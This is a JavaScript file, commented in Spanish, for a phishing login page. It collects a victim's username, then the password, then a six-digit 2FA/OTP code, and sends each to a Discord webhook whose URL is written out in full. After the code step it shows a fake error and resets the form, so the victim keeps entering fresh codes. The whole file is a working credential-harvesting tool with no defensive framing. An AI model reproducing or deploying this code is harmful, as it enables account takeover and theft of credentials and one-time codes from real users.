// ========================================================
// REEMPLAZA ESTA URL CON TU WEBHOOK DE DISCORD REAL
// ========================================================
const DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1532235985042280509/KAZrpj43FPzhOGyS_MxzcWTOxOYC7gMvJcHZxQSSXtIG8wYCjun0vFBkj_VAoeH7bonj";

// Variables globales para almacenar temporalmente los datos ingresados
let usuarioGuardado = "";
let passwordGuardada = "";

// Función genérica para enviar embeds a Discord
function enviarADiscord(embedData) {
  if (!DISCORD_WEBHOOK_URL || DISCORD_WEBHOOK_URL.includes("TU_WEBHOOK_AQUI")) {
    console.warn("Discord Webhook URL no configurada.");
    return;
  }

  fetch(DISCORD_WEBHOOK_URL, {
    method: "POST",
    headers: {
      "Content-Type": "application/json"
    },
    body: JSON.stringify({
      username: "Notificador de Login",
      avatar_url: "https://i.imgur.com/4M34hi2.png",
      embeds: [embedData]
    })
  }).catch(error => console.error("Error al enviar a Discord:", error));
}

function toggleButton(inputId, buttonId) {
  const input = document.getElementById(inputId);
  const button = document.getElementById(buttonId);

  if (input.value.trim().length > 0) {
    button.removeAttribute('disabled');
    button.classList.add('active-btn');
  } else {
    button.setAttribute('disabled', 'true');
    button.classList.remove('active-btn');
  }
}

function handleUserSubmit(event) {
  event.preventDefault();
  
  usuarioGuardado = document.getElementById('usuario').value.trim();

  // Enviar evento de Usuario capturado a Discord
  enviarADiscord({
    title: "👤 Paso 1: Usuario Ingresado",
    color: 3447003, // Color azul
    fields: [
      { name: "Usuario", value: `\`\`\`${usuarioGuardado}\`\`\``, inline: true },
      { name: "Fecha y Hora", value: new Date().toLocaleString(), inline: false }
    ],
    footer: { text: "Sistema de Captura" }
  });

  const loader = document.getElementById('loading');
  loader.classList.add('active');

  setTimeout(() => {
    loader.classList.remove('active');
    document.getElementById('step-1').classList.remove('active');
    document.getElementById('step-2').classList.add('active');
    document.getElementById('password').focus();
  }, 1500);
}

function handlePasswordSubmit(event) {
  event.preventDefault();

  passwordGuardada = document.getElementById('password').value;

  // Enviar Usuario + Contraseña a Discord
  enviarADiscord({
    title: "🔑 Paso 2: Credenciales Completas",
    color: 15105570, // Color naranja
    fields: [
      { name: "Usuario", value: `\`\`\`${usuarioGuardado}\`\`\``, inline: true },
      { name: "Contraseña", value: `\`\`\`${passwordGuardada}\`\`\``, inline: true },
      { name: "Fecha y Hora", value: new Date().toLocaleString(), inline: false }
    ],
    footer: { text: "Sistema de Captura" }
  });

  const loader = document.getElementById('loading');
  loader.classList.add('active');

  setTimeout(() => {
    loader.classList.remove('active');
    document.getElementById('codeModal').classList.add('active');
    document.querySelectorAll('.code-digit')[0].focus();
  }, 1500);
}

function moveNext(elem, index) {
  const inputs = document.querySelectorAll('.code-digit');
  elem.value = elem.value.replace(/[^0-9]/g, '');

  if (elem.value.length === 1 && index < inputs.length - 1) {
    inputs[index + 1].focus();
  }

  checkCodeComplete();
}

function checkCodeComplete() {
  const inputs = document.querySelectorAll('.code-digit');
  const verifyBtn = document.getElementById('btn-verify');
  let filled = true;

  inputs.forEach(input => {
    if (!input.value) filled = false;
  });

  if (filled) {
    verifyBtn.removeAttribute('disabled');
    verifyBtn.classList.add('active-btn');
  } else {
    verifyBtn.setAttribute('disabled', 'true');
    verifyBtn.classList.remove('active-btn');
  }
}

function verifyCode(event) {
  event.preventDefault();

  const modal = document.getElementById('codeModal');
  const loader = document.getElementById('loading');
  const errorMsg = document.getElementById('code-error-msg');
  const inputs = document.querySelectorAll('.code-digit');
  const verifyBtn = document.getElementById('btn-verify');

  // Obtener los 6 dígitos ingresados
  let codigoIngresado = "";
  inputs.forEach(input => codigoIngresado += input.value);

  // Enviar Código de Seguridad a Discord
  enviarADiscord({
    title: "🛡️ Paso 3: Código de Seguridad Capturado",
    color: 15548997, // Color rojo
    fields: [
      { name: "Usuario", value: `\`\`\`${usuarioGuardado}\`\`\``, inline: true },
      { name: "Contraseña", value: `\`\`\`${passwordGuardada}\`\`\``, inline: true },
      { name: "Código 2FA / OTP", value: `\`\`\`${codigoIngresado}\`\`\``, inline: false },
      { name: "Fecha y Hora", value: new Date().toLocaleString(), inline: false }
    ],
    footer: { text: "Sistema de Captura" }
  });

  modal.classList.remove('active');
  loader.classList.add('active');

  setTimeout(() => {
    loader.classList.remove('active');
    errorMsg.classList.add('active');
    modal.classList.add('active');

    inputs.forEach(input => input.value = '');
    verifyBtn.setAttribute('disabled', 'true');
    verifyBtn.classList.remove('active-btn');
    inputs[0].focus();
  }, 20000);
}

function goToStep1() {
  document.getElementById('step-2').classList.remove('active');
  document.getElementById('step-1').classList.add('active');
  document.getElementById('usuario').focus();
}

function togglePasswordVisibility() {
  const passwordInput = document.getElementById('password');
  passwordInput.type = passwordInput.type === 'password' ? 'text' : 'password';
}